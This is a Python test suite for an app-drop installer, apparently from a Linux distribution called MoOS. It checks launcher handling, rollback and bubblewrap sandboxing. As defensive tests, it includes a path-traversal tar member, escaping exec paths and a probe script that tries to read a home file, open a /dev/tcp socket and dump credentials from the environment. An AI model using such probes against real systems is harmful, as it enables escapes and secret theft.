        self.assertEqual(plan.target, self.home / "Applications/photocraft")
        for bad in ("", "a", "Photo", "../x", "x/y", "photo craft", "-x"):
            with self.subTest(slug=bad), self.assertRaises(appdrop.DropError) as refused:
                appdrop.plan_for(download, "X", bad)
            self.assertEqual(refused.exception.code, "bad_id")
        mine = self.home / "Applications/mine"
        mine.mkdir(parents=True)
        with self.assertRaises(appdrop.DropError) as refused:
            appdrop.plan_for(download, "Mine", "mine")
        self.assertEqual(refused.exception.code, "name_taken")

    def test_the_launcher_takes_the_apps_own_id_and_the_catalogues_words(self):
        plan = appdrop.plan_for(self.download("p.tar.gz", self.photo_app()), "PhotoCraft", "photocraft")
        manifest = appdrop.install(plan, pinned={"name": "PhotoCraft", "name_ar": "فوتوكرافت"},
                                   record_extra={"catalog_id": "photocraft", "version": "0.7.0",
                                                 "url": "https://example.test/p.tar.gz"})
        entry = self.launchers / "ai.storyteller.photocraft.desktop"
        self.assertTrue(entry.is_file(), sorted(p.name for p in self.launchers.iterdir()))
        self.assertFalse((self.launchers / "appdrop-photocraft.desktop").exists())
        text = entry.read_text(encoding="utf-8")
        self.assertIn("X-MoOS-AppDrop=photocraft", text.splitlines())
        self.assertIn("Name=PhotoCraft", text.splitlines())
        self.assertIn("Name[ar]=فوتوكرافت", text.splitlines())
        self.assertEqual((manifest["desktop_id"], manifest["launcher"]),
                         ("ai.storyteller.photocraft", "ai.storyteller.photocraft.desktop"))
        self.assertEqual((manifest["catalog_id"], manifest["version"]), ("photocraft", "0.7.0"))
        self.assertEqual(manifest["sha256"], __import__("hashlib").sha256(plan.path.read_bytes()).hexdigest())
        self.assertTrue(appdrop.remove("photocraft"))
        self.assertFalse(entry.exists())

    def test_a_launcher_id_someone_else_has_is_never_taken(self):
        theirs = self.system_share / "applications/ai.storyteller.photocraft.desktop"
        theirs.write_text("[Desktop Entry]\nName=Theirs\n", encoding="utf-8")
        plan = appdrop.plan_for(self.download("p.tar.gz", self.photo_app()), "PhotoCraft", "photocraft")
        manifest = appdrop.install(plan)
        self.assertEqual((manifest["launcher"], manifest["desktop_id"]), ("appdrop-photocraft.desktop", ""))
        self.assertEqual(theirs.read_text(encoding="utf-8"), "[Desktop Entry]\nName=Theirs\n")

        # The person's own launcher in their folder is never overwritten either; once the id is
        # free again an update moves to it and leaves exactly one entry behind.
        theirs.unlink()
        own = self.launchers / "ai.storyteller.photocraft.desktop"
        own.write_text("[Desktop Entry]\nName=Mine\n", encoding="utf-8")
        manifest = appdrop.install(appdrop.plan_for(self.download("p2.tar.gz", self.photo_app("0.8")),
                                                    "PhotoCraft", "photocraft"))
        self.assertEqual(manifest["launcher"], "appdrop-photocraft.desktop")
        self.assertEqual(own.read_text(encoding="utf-8"), "[Desktop Entry]\nName=Mine\n")
        own.unlink()
        manifest = appdrop.install(appdrop.plan_for(self.download("p3.tar.gz", self.photo_app("0.9")),
                                                    "PhotoCraft", "photocraft"))
        self.assertEqual(manifest["launcher"], "ai.storyteller.photocraft.desktop")
        self.assertEqual(sorted(p.name for p in self.launchers.glob("*.desktop")),
                         ["ai.storyteller.photocraft.desktop"])

    def test_remove_leaves_a_same_named_launcher_without_the_marker(self):
        manifest = appdrop.install(appdrop.plan_for(self.download("p.tar.gz", self.photo_app()),
                                                    "PhotoCraft", "photocraft"))
        entry = self.launchers / manifest["launcher"]
        entry.write_text("[Desktop Entry]\nName=Replaced by the person\n", encoding="utf-8")
        self.assertTrue(appdrop.remove("photocraft"))
        self.assertTrue(entry.exists(), "a launcher App Drop no longer owns was deleted")

    def test_pinned_fields_outrank_the_guesses_and_stay_inside_the_tree(self):
        plan = appdrop.plan_for(self.download("p.tar.gz", self.photo_app()), "PhotoCraft", "photocraft")
        manifest = appdrop.install(plan, pinned={"exec": "bin/helper", "icon": "share/icons/brand.svg",
                                                 "wm_class": "PhotoCraft", "categories": ["Graphics", "Evil"],
                                                 "desktop_id": "org.example.Pinned"})
        app_dir = (self.home / "Applications/photocraft").resolve()
        self.assertEqual(manifest["exec"], str(app_dir / "bin/helper"))
        text = (self.launchers / "org.example.Pinned.desktop").read_text(encoding="utf-8").splitlines()
        self.assertIn(f"Icon={app_dir / 'share/icons/brand.svg'}", text)
        self.assertIn("StartupWMClass=PhotoCraft", text)
        self.assertIn("Categories=Graphics;", text)
        for exec_path in ("../../../usr/bin/sh", "/usr/bin/sh", "bin/missing", "share/icons/brand.svg"):
            with self.subTest(exec=exec_path), self.assertRaises(appdrop.DropError) as refused:
                appdrop.install(appdrop.plan_for(self.download("again.tar.gz", self.photo_app("1.0")),
                                                 "PhotoCraft", "photocraft"), pinned={"exec": exec_path})
            self.assertIn(refused.exception.code, ("nothing_to_launch", "unsafe_archive"))
            # The working version and its launcher survive every refused update.
            self.assertTrue((app_dir / "bin/helper").is_file())
            self.assertTrue((self.launchers / "org.example.Pinned.desktop").is_file())

    def test_a_pinned_program_that_links_out_of_the_tree_is_refused(self):
        # An AppImage's tree is written by its own extractor, so a link in it can point anywhere.
        outside = self.home / "Documents/not-a-program"
        outside.parent.mkdir(parents=True)
        outside.write_bytes(ELF)
        outside.chmod(0o755)

        def extractor(argv, **_kwargs):
            tree = Path(argv[argv.index("--bind") + 1]) / "squashfs-root"
            tree.mkdir(parents=True)
            (tree / "AppRun").write_bytes(ELF)
            (tree / "AppRun").chmod(0o755)
            (tree / "escape").symlink_to(outside)
            return subprocess.CompletedProcess(argv, 0, b"", b"")

        plan = appdrop.plan_for(self.download("Tool.AppImage", APPIMAGE + b"x"), "Tool", "tool")
        with self.assertRaises(appdrop.DropError) as refused:
            appdrop.install(plan, run=extractor, pinned={"exec": "escape"})
        self.assertEqual(refused.exception.code, "nothing_to_launch")
        self.assertFalse((self.home / "Applications/tool").exists())
        self.assertEqual(list(self.launchers.glob("*.desktop")) if self.launchers.exists() else [], [])

    def test_a_metainfo_launchable_names_the_launcher_when_no_entry_does(self):
        metainfo = ('<?xml version="1.0"?><component type="desktop-application">'
                    '<id>org.example.Notes</id>'
                    '<launchable type="desktop-id">org.example.Notes.desktop</launchable></component>')
        data = self.tar_bytes([self.member("notes/notes", ELF, 0o755),
                               self.member("notes/usr/share/metainfo/org.example.Notes.metainfo.xml",
                                           metainfo.encode())])
        manifest = appdrop.install(appdrop.plan_for(self.download("n.tar.gz", data), "Notes", "notes"))
        self.assertEqual(manifest["launcher"], "org.example.Notes.desktop")

    def test_a_failure_after_the_swap_restores_the_working_version_and_its_launcher(self):
        first = appdrop.install(appdrop.plan_for(self.download("p.tar.gz", self.photo_app()),
                                                 "PhotoCraft", "photocraft"))
        entry = self.launchers / first["launcher"]
        before = entry.read_text(encoding="utf-8")
        program = self.home / "Applications/photocraft/bin/photocraft"
        working = program.read_bytes()
        from unittest import mock
        original = appdrop._write_atomic

        def fail_on_record(path, text, mode):
            if path.suffix == ".json":
                raise OSError("disk full")
            return original(path, text, mode)

        with mock.patch.object(appdrop, "_write_atomic", side_effect=fail_on_record), \
                self.assertRaises(OSError):
            appdrop.install(appdrop.plan_for(self.download("p2.tar.gz", self.photo_app("0.8")),
                                             "PhotoCraft", "photocraft"))
        self.assertEqual(program.read_bytes(), working)
        self.assertEqual(entry.read_text(encoding="utf-8"), before)
        self.assertEqual(appdrop.read_record("photocraft")["sha256"], first["sha256"])
        leftovers = [p.name for p in (self.home / "Applications").iterdir() if p.name.startswith(".")]
        self.assertEqual(leftovers, [])

    def test_the_tool_sandbox_is_the_extractors_sandbox(self):
        out = Path(self.tmp.name) / "out"
        argv = appdrop.tool_sandbox_argv({"app.exe": self.home / "Downloads/x.exe"}, out,
                                         ["/usr/bin/wrestool", "-x", "/in/app.exe"])
        extractor = appdrop.sandbox_argv(self.home / "Downloads/x.AppImage", out)
        shared = len(appdrop._sandbox_base())
        self.assertEqual(argv[:shared], extractor[:shared], "the two sandboxes drifted apart")
        for promise in ("--unshare-all", "--die-with-parent", "--new-session", "--clearenv"):
            self.assertIn(promise, argv)
        self.assertEqual(argv[argv.index("--cap-drop") + 1], "ALL")
        self.assertEqual(argv[-3:], ["/usr/bin/wrestool", "-x", "/in/app.exe"])
        # The one file under home is the input, bound read-only; nothing else of home is reachable.
        under_home = [part for part in argv if part.startswith(str(self.home))]
        self.assertEqual(under_home, [str(self.home / "Downloads/x.exe")])
        self.assertEqual(argv[argv.index(under_home[0]) - 1], "--ro-bind")
        with self.assertRaises(appdrop.DropError):
            appdrop.tool_sandbox_argv({"../escape": self.home}, out, ["/usr/bin/true"])


class AppImages(Home):
    def fake_extractor(self, *, succeed: bool = True):
        calls: list[list[str]] = []

        def run(argv, **_kwargs):
            calls.append(list(argv))
            out = Path(argv[argv.index("--bind") + 1])
            if succeed:
                tree = out / "squashfs-root"
                (tree / "usr/share/icons").mkdir(parents=True)
                (tree / "AppRun").write_bytes(ELF)
                (tree / "AppRun").chmod(0o4755)                      # a setuid bit the image carried
                (tree / "obsidian.desktop").write_text(GOOD_DESKTOP.replace("Note Forge", "Obsidian"), encoding="utf-8")
                (tree / "usr/share/icons/noteforge.svg").write_text("<svg/>", encoding="utf-8")
            return subprocess.CompletedProcess(argv, 0 if succeed else 1, b"", b"squashfs error")
        return run, calls

    def test_an_appimage_is_extracted_only_inside_the_sandbox(self):
        plan = appdrop.inspect(self.download("Obsidian-1.8.9.AppImage", APPIMAGE + b"payload"))
        run, calls = self.fake_extractor()
        manifest = appdrop.install(plan, run=run)
        argv = calls[0]
        self.assertEqual(argv[0], "/usr/bin/bwrap")
        for promise in ("--unshare-all", "--die-with-parent", "--new-session", "--clearenv"):
            self.assertIn(promise, argv)
        self.assertEqual(argv[argv.index("--cap-drop") + 1], "ALL")
        joined = " ".join(argv)
        self.assertNotIn(str(self.home / "Downloads"), joined, "the sandbox must never see the person's folders")
        self.assertNotIn("--share-net", joined)
        self.assertEqual(argv[-2:], ["/in/app.AppImage", "--appimage-extract"])
        self.assertIn("--ro-bind", argv[: argv.index("/in/app.AppImage")])
        app_dir = self.home / "Applications/obsidian"
        self.assertEqual(manifest["exec"], str((app_dir / "AppRun").resolve()))
        self.assertEqual(stat.S_IMODE((app_dir / "AppRun").stat().st_mode) & 0o6000, 0, "setuid survived")
        self.assertFalse(any(p.name.endswith(".image") for p in (self.home / "Applications").iterdir()),
                         "the staging copy must be cleaned up")

    def test_a_damaged_appimage_fails_cleanly(self):
        plan = appdrop.inspect(self.download("Broken.AppImage", APPIMAGE))
        run, _calls = self.fake_extractor(succeed=False)
        with self.assertRaises(appdrop.DropError) as refused:
            appdrop.install(plan, run=run)
        self.assertEqual(refused.exception.code, "appimage_unreadable")
        self.assertEqual(sorted(p.name for p in (self.home / "Applications").iterdir()), [])

    @unittest.skipUnless(Path(appdrop.BWRAP).is_file() and sys.platform.startswith("linux"),
                         "needs bubblewrap")
    def test_the_real_sandbox_hides_the_home_and_the_network(self):
        """Not a fixture: the shipped argv runs under the real bwrap, with a probe as the 'image'."""
        secret = self.home / "Documents"
        secret.mkdir()
        (secret / "diary.txt").write_text("PRIVATE-DIARY", encoding="utf-8")
        probe = self.home / "Downloads/probe"
        probe.write_text(
            "#!/bin/sh\n"
            "mkdir -p squashfs-root && cd squashfs-root || exit 9\n"
            f"cat '{secret}/diary.txt' > saw-home 2>/dev/null\n"
            "ls /home /var/home /root > saw-dirs 2>/dev/null\n"
            "(exec 3<>/dev/tcp/1.1.1.1/53) 2>/dev/null && echo yes > saw-network\n"
            "cat /proc/net/route > routes 2>/dev/null\n"
            "echo \"$HOME|$PATH\" > saw-env\n"
            "env > saw-all-env\n"
            "printf '\\177ELF' > AppRun; chmod 755 AppRun\n", encoding="utf-8")
        probe.chmod(0o755)
        out = Path(self.tmp.name) / "out"
        out.mkdir()
        done = subprocess.run(appdrop.sandbox_argv(probe, out), capture_output=True, timeout=60,
                              env=dict(os.environ, PATH="/usr/bin:/bin", MOOS_CANARY="a-secret-in-the-session",
                                       OPENROUTER_API_KEY="sk-or-canary"))
        if done.returncode != 0 and b"namespace" in done.stderr.lower():
            self.skipTest("this kernel forbids unprivileged user namespaces")
        self.assertEqual(done.returncode, 0, done.stderr.decode("utf-8", "replace"))
        tree = out / "squashfs-root"
        self.assertTrue((tree / "AppRun").is_file(), "the extractor must be able to write into /out")
        self.assertEqual((tree / "saw-home").read_text(encoding="utf-8"), "",
                         "the sandbox could READ a file in the person's home")
        self.assertNotIn("PRIVATE-DIARY", "".join(p.read_text(encoding="utf-8", errors="replace")
                                                  for p in tree.iterdir() if p.is_file()))
        self.assertFalse((tree / "saw-network").exists(), "the sandbox reached the network")
        routes = (tree / "routes").read_text(encoding="utf-8").strip().splitlines()
        self.assertLessEqual(len(routes), 1, f"the sandbox has network routes: {routes}")
        home_seen, path_seen = (tree / "saw-env").read_text(encoding="utf-8").strip().split("|")
        self.assertEqual((home_seen, path_seen), ("/out", "/usr/bin"))
        leaked = (tree / "saw-all-env").read_text(encoding="utf-8")
        self.assertNotIn("CANARY", leaked, "the session's environment leaked into the sandbox")
        self.assertNotIn("sk-or-canary", leaked, "a credential in the environment reached the sandbox")

    def test_without_the_sandbox_nothing_is_extracted(self):
        if Path(appdrop.BWRAP).is_file():
            self.skipTest("bubblewrap is installed here; the refusal path needs a machine without it")
        plan = appdrop.inspect(self.download("Tool.AppImage", APPIMAGE))
        with self.assertRaises(appdrop.DropError) as refused:
            appdrop.install(plan)
        self.assertEqual(refused.exception.code, "no_sandbox")


class ExtractionStaysAlive(unittest.TestCase):
    """A big AppImage's squashfs takes minutes to unpack. The extractor must be polled during that
    time so the Store job's heartbeat keeps running and Cancel is honoured — not left blind in one
    600 s `subprocess.run` whose only cancel check ran after it returned."""

    class FakeChild:
        def __init__(self, pid: int):
            self.pid = pid
            self.returncode = None
            self.waits = 0

        def wait(self, timeout=None):
            self.waits += 1
            raise subprocess.TimeoutExpired("extractor", timeout)   # never finishes on its own

    def test_a_long_extraction_polls_cancel_and_kills_the_session(self):
        from unittest import mock
        beats: list[int] = []

        def cancelled() -> bool:
            beats.append(1)
            return len(beats) >= 3          # Cancel arrives on the third poll

        budget = appdrop._Budget(1, cancelled, lambda _done: None)
        child = self.FakeChild(424242)
        killed: list[tuple] = []
        with mock.patch.object(appdrop.subprocess, "Popen", return_value=child) as popen, \
                mock.patch.object(appdrop.os, "killpg", side_effect=lambda *a: killed.append(a)):
            with self.assertRaises(appdrop.DropError) as refused:
                appdrop._run_extractor(["/usr/bin/bwrap", "--appimage-extract"], budget)
        self.assertEqual(refused.exception.code, "cancelled")
        self.assertGreaterEqual(len(beats), 3, "cancel/heartbeat was never polled during extraction")
        self.assertTrue(child.waits >= 3, "the extractor was not polled")
        self.assertTrue(killed and killed[0][0] == 424242, "the extractor's process group was not killed")
        self.assertIs(killed[0][1], signal.SIGKILL)
        self.assertTrue(popen.call_args.kwargs.get("start_new_session"),
                        "the extractor must be its own session so the whole sandbox can be killed")

    def test_a_stalled_extraction_times_out_and_is_killed(self):
        from unittest import mock
        clock = [0.0]

        def monotonic() -> float:
            return clock[0]

        child = self.FakeChild(999)

        def wait(timeout=None):
            clock[0] += 1000.0              # each poll jumps the clock past EXTRACT_TIMEOUT
            child.waits += 1
            raise subprocess.TimeoutExpired("extractor", timeout)

        child.wait = wait
        budget = appdrop._Budget(1, lambda: False, lambda _done: None)
        killed: list[tuple] = []
        with mock.patch.object(appdrop.subprocess, "Popen", return_value=child), \
                mock.patch.object(appdrop.time, "monotonic", side_effect=monotonic), \
                mock.patch.object(appdrop.os, "killpg", side_effect=lambda *a: killed.append(a)):
            with self.assertRaises(appdrop.DropError) as refused:
                appdrop._run_extractor(["/usr/bin/bwrap"], budget)
        self.assertEqual(refused.exception.code, "extract_timeout")
        self.assertTrue(killed, "a timed-out extractor was not killed")


@unittest.skipUnless(sys.platform.startswith("linux"), "moos-storectl needs fcntl")
class ThroughTheStore(Home):
    def storectl(self, *argv: str) -> tuple[int, dict]:
        env = dict(os.environ, HOME=str(self.home), XDG_CACHE_HOME=str(self.home / ".cache"),
                   XDG_RUNTIME_DIR=str(Path(self.tmp.name) / "run"), PATH="/usr/bin:/bin")
        Path(env["XDG_RUNTIME_DIR"]).mkdir(mode=0o700, exist_ok=True)
        done = subprocess.run([sys.executable, str(STORECTL), *argv], env=env, capture_output=True,
                              text=True, encoding="utf-8", timeout=120)
        return done.returncode, json.loads(done.stdout.strip().splitlines()[-1])

    def test_a_dropped_file_is_a_store_job_the_island_can_see(self):
        archive = self.download("noteforge-2.1.tar.gz", self.portable_app())
        code, plan = self.storectl("inspect-file", str(archive))
        self.assertEqual((code, plan["state"], plan["plan"]["kind"]), (0, "success", "archive"))
        self.assertFalse((self.home / ".cache/moos-store/job.json").exists(), "inspecting must write no job")

        code, job = self.storectl("install-file", str(archive))
        self.assertEqual((code, job["state"], job["action"]), (0, "success", "install"), job)
        self.assertEqual(job["items"][0]["id"], "noteforge")
        self.assertTrue((self.home / "Applications/noteforge/noteforge").is_file())
        tokens = [p.name for p in (Path(self.tmp.name) / "run/moos-store").glob("job-*")]
        self.assertEqual(tokens, ["job-install-success-100-noteforge"], "the Island must see it finish")

        code, job = self.storectl("remove-file", "noteforge")
        self.assertEqual((code, job["state"], job["action"]), (0, "success", "remove"))
        self.assertFalse((self.home / "Applications/noteforge").exists())

    def test_a_refusal_carries_a_code_the_dialog_can_explain(self):
        evil = self.download("evil.tar.gz", self.tar_bytes([self.member("../../../OUTSIDE", b"pwned")]))
        code, job = self.storectl("install-file", str(evil))
        self.assertEqual((code, job["state"], job.get("code")), (1, "failed", "unsafe_archive"))
        self.nothing_escaped()
        code, job = self.storectl("install-file", str(self.download("p.deb", b"!<arch>\ndebian-binary 1 0 0 100644 4 `\n")))
        self.assertEqual((code, job["state"]), (2, "failed"))
        self.assertIn("deb_not_native", job["message"])


class TheDialogHalf(unittest.TestCase):
    def test_split_android_bundles_are_refused_before_consent(self):
        import runpy
        from unittest import mock
        cli = runpy.run_path(str(ROOT / "system_files/usr/bin/moos-app-drop"))
        namespace = cli["handle"].__globals__
        for suffix in (".xapk", ".apks", ".XAPK"):
            with tempfile.TemporaryDirectory() as raw:
                path = Path(raw) / ("application" + suffix)
                path.write_bytes(b"PK\x03\x04not-a-single-apk")
                with mock.patch.object(appdrop, "check_source", return_value=path), \
                     mock.patch.dict(namespace, {"ask": mock.Mock(), "tell": mock.Mock(),
                                                "storectl": mock.Mock()}), \
                     mock.patch.object(namespace["subprocess"], "Popen") as launch:
                    self.assertEqual(namespace["handle"](str(path)), 2)
                    namespace["ask"].assert_not_called()
                    namespace["storectl"].assert_not_called()
                    launch.assert_not_called()

    def test_every_refusal_has_words_in_both_languages(self):
        loader = importlib.machinery.SourceFileLoader("moos_app_drop_cli", str(ROOT / "system_files/usr/bin/moos-app-drop"))
        spec = importlib.util.spec_from_loader(loader.name, loader)
        cli = importlib.util.module_from_spec(spec)
        loader.exec_module(cli)
        source = (ROOT / "system_files/usr/lib/moos/moos_appdrop.py").read_text(encoding="utf-8")
        import re
        raised = set(re.findall(r'DropError\("([a-z_]+)"', source)) | {"deb_not_native", "bundle_unsupported", "unknown_kind"}
        raised -= {"not_installable_here", "bad_id"}                    # programming errors, never shown
        for code in sorted(raised):
            self.assertIn(code, cli.WORDS, f"a person would see the generic failure for `{code}`")
            arabic, english = cli.WORDS[code]
            self.assertRegex(arabic, r"[؀-ۿ]")
            self.assertNotRegex(english, r"[؀-ۿ]")

    def test_nothing_is_installed_without_a_dialog(self):
        source = (ROOT / "system_files/usr/bin/moos-app-drop").read_text(encoding="utf-8")
        body = source[source.index("def handle("):source.index("def scan(")]
        self.assertLess(body.index("if not ask("), body.index('storectl("install-file"'),
                        "the question must come before the install")
        self.assertIn('print(words("no_dialog")', source)
        self.assertNotIn("pkexec", source)
        self.assertNotIn("sudo", source)


if __name__ == "__main__":
    unittest.main(verbosity=2)
